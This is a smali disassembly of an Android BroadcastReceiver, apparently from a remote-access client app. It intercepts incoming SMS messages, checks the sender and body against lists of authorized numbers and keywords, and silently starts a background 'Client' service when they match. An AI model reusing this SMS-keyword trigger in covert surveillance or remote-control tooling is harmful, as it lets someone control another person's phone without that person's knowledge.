.class Lmy/app/client/ClientListener$1;
.super Landroid/content/BroadcastReceiver;
.source "ClientListener.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lmy/app/client/ClientListener;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final SMS_RECEIVED:Ljava/lang/String;

.field final synthetic this$0:Lmy/app/client/ClientListener;


# direct methods
.method constructor <init>(Lmy/app/client/ClientListener;)V
    .locals 1
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lmy/app/client/ClientListener$1;->this$0:Lmy/app/client/ClientListener;

    .line 134
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 136
    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    iput-object v0, p0, Lmy/app/client/ClientListener$1;->SMS_RECEIVED:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .parameter "context"
    .parameter "intent"

    .prologue
    const/4 v12, 0x0

    .line 141
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v10

    const-string v11, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_1

    .line 142
    const-string v10, "SMSReceived"

    const-string v11, "onReceive sms !"

    invoke-static {v10, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 144
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 145
    .local v0, bundle:Landroid/os/Bundle;
    if-eqz v0, :cond_1

    .line 146
    const-string v10, "pdus"

    invoke-virtual {v0, v10}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    .line 148
    .local v6, pdus:[Ljava/lang/Object;
    array-length v10, v6

    new-array v5, v10, [Landroid/telephony/SmsMessage;

    .line 149
    .local v5, messages:[Landroid/telephony/SmsMessage;
    const/4 v3, 0x0

    .local v3, i:I
    :goto_0
    array-length v10, v6

    if-lt v3, v10, :cond_2

    .line 152
    array-length v10, v5

    const/4 v11, -0x1

    if-le v10, v11, :cond_1

    .line 154
    aget-object v10, v5, v12

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    .line 155
    .local v4, messageBody:Ljava/lang/String;
    aget-object v10, v5, v12

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v7

    .line 157
    .local v7, phoneNumber:Ljava/lang/String;
    iget-object v10, p0, Lmy/app/client/ClientListener$1;->this$0:Lmy/app/client/ClientListener;

    iget-object v10, v10, Lmy/app/client/ClientListener;->authorizedNumbersCall:Ljava/util/ArrayList;

    if-eqz v10, :cond_7

    .line 158
    const/4 v1, 0x0

    .line 159
    .local v1, found:Z
    const/4 v2, 0x0

    .line 160
    .local v2, foundk:Z
    iget-object v10, p0, Lmy/app/client/ClientListener$1;->this$0:Lmy/app/client/ClientListener;

    iget-object v10, v10, Lmy/app/client/ClientListener;->authorizedNumbersSMS:Ljava/util/ArrayList;

    invoke-virtual {v10}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :cond_0
    :goto_1
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-nez v11, :cond_3

    .line 164
    if-nez v1, :cond_4

    .line 183
    .end local v0           #bundle:Landroid/os/Bundle;
    .end local v1           #found:Z
    .end local v2           #foundk:Z
    .end local v3           #i:I
    .end local v4           #messageBody:Ljava/lang/String;
    .end local v5           #messages:[Landroid/telephony/SmsMessage;
    .end local v6           #pdus:[Ljava/lang/Object;
    .end local v7           #phoneNumber:Ljava/lang/String;
    :cond_1
    :goto_2
    return-void

    .line 150
    .restart local v0       #bundle:Landroid/os/Bundle;
    .restart local v3       #i:I
    .restart local v5       #messages:[Landroid/telephony/SmsMessage;
    .restart local v6       #pdus:[Ljava/lang/Object;
    :cond_2
    aget-object v10, v6, v3

    check-cast v10, [B

    invoke-static {v10}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v10

    aput-object v10, v5, v3

    .line 149
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 160
    .restart local v1       #found:Z
    .restart local v2       #foundk:Z
    .restart local v4       #messageBody:Ljava/lang/String;
    .restart local v7       #phoneNumber:Ljava/lang/String;
    :cond_3
    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 161
    .local v8, s:Ljava/lang/String;
    invoke-virtual {v8, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_0

    .line 162
    const/4 v1, 0x1

    goto :goto_1

    .line 166
    .end local v8           #s:Ljava/lang/String;
    :cond_4
    iget-object v10, p0, Lmy/app/client/ClientListener$1;->this$0:Lmy/app/client/ClientListener;

    iget-object v10, v10, Lmy/app/client/ClientListener;->authorizedNumbersKeywords:Ljava/util/ArrayList;

    if-eqz v10, :cond_6

    .line 167
    iget-object v10, p0, Lmy/app/client/ClientListener$1;->this$0:Lmy/app/client/ClientListener;

    iget-object v10, v10, Lmy/app/client/ClientListener;->authorizedNumbersKeywords:Ljava/util/ArrayList;

    invoke-virtual {v10}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :cond_5
    :goto_3
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-nez v11, :cond_8

    .line 171
    if-eqz v2, :cond_1

    .line 174
    :cond_6
    const-string v10, "Client"

    const-string v11, "Incoming call authorized"

    invoke-static {v10, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 177
    .end local v1           #found:Z
    .end local v2           #foundk:Z
    :cond_7
    new-instance v9, Landroid/content/Intent;

    const-class v10, Lmy/app/client/Client;

    invoke-direct {v9, p1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 178
    .local v9, serviceIntent:Landroid/content/Intent;
    const-string v10, "SMSReceiver"

    invoke-virtual {v9, v10}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 179
    invoke-virtual {p1, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_2

    .line 167
    .end local v9           #serviceIntent:Landroid/content/Intent;
    .restart local v1       #found:Z
    .restart local v2       #foundk:Z
    :cond_8
    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 168
    .restart local v8       #s:Ljava/lang/String;
    invoke-virtual {v4, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    .line 169
    const/4 v2, 0x1

    goto :goto_3
.end method
